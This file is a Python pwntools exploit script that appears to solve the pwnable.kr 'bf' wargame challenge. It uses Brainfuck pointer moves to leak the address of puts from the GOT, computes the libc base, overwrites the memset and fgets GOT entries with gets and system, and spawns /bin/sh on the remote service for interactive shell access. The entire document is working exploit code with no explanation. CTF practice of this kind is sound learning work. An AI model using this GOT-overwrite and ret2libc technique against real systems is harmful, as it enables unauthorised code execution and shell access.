from pwn import *

elf  = ELF('./bf')
libc = ELF('./bf_libc.so')

def back(offset):
	global pPos
	pPos -= offset
	return '<'*offset

def forward(offset):
	global pPos
	pPos += offset
	return '>'*offset

def write(value):
	global pPos
	pPos += value
	return ',>'*value

def read(value):
	global pPos
	pPos += value
	return '.>'*value

def backToMain():
	return '['


fgets_got = elf.symbols['got.fgets'] #0x804a010
puts_got = elf.symbols['got.puts'] #0x804a018
memset_got = elf.symbols['got.memset'] #0x804a02c
pPos = 0x0804a0a0
return_addr = 0x08048700

#r = process('./bf')
r = remote('pwnable.kr', 9001)
r.recvline_startswith('type')

# leak puts address and overwrite return_addr to puts@got
payload  = back(pPos-puts_got) + read(4) + back(4) + write(4)
# replace memset_got with gets
payload += forward(memset_got-pPos) + write(4)
# replace fgets_got with system
payload += back(pPos-fgets_got) + write(4) + backToMain()

r.sendline(payload)
r.send(p32(return_addr))
sleep(1)
puts_addr = u32(r.recv(4))

libc_base = puts_addr - libc.symbols['puts']
system    = libc_base + libc.symbols['system']
gets      = libc_base + libc.symbols['gets']

r.send(p32(gets))
r.send(p32(system))
r.sendline('/bin/sh\x00')
r.interactive()